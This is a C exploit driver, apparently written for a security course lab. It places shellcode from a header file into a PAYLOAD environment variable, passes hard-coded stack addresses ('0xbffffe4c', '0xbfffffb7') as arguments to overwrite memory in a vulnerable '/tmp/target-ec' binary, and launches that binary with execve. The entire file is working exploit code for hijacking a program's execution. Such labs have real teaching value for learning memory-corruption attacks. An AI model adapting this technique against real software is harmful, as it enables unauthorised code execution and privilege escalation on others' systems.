#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target-ec"

int main(void)
{
  char *args[4];
  char *env[2];

  args[0] = TARGET;  

  // Define variables
  int shellcode_size = strlen(shellcode);
  char env_name[] = "PAYLOAD=";
  int env_name_length = strlen(env_name);
  int payload_size = env_name_length + shellcode_size + 1;

  printf("%s\n", "Setting Environment");

  // Allocate the payload
  env[0] = malloc(payload_size);

  // Set the payload
  int i = 0;
  int j = 0;
  for(i = 0; i < env_name_length; ++i)
  {
     env[0][i] = env_name[i];
  }
  for(j = 0; j < shellcode_size; ++j, ++i)
  {
     env[0][i] = shellcode[j];
  }
  env[0][i++] = '\0';

  printf("Payload Size: %d\n", payload_size);
  printf("Written Size: %d\n", i);
  printf("%s\n", "Setting Addresses");

  int length = 11;
  args[1] = malloc(length);
  args[2] = malloc(length);

  // Set destination address
  // args[1][0] = '\x4c';
  // args[1][1] = '\xfe';
  // args[1][2] = '\xff';
  // args[1][3] = '\xbf';
  // args[1][4] = '\0';
  char dest[] = "0xbffffe4c\0";
  memcpy(&args[1][0], &dest, length);

  // Set value to overwrite
  // args[2][0] = '\xb7';
  // args[2][1] = '\xff';
  // args[2][2] = '\xff';
  // args[2][3] = '\xbf';
  // args[2][4] = '\0';
  char value[] = "0xbfffffb7\0";
  memcpy(&args[2][0], &value, length);

  args[3] = NULL;
  env[1] = NULL;

  printf("%s\n", "Beginning Exploit");

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
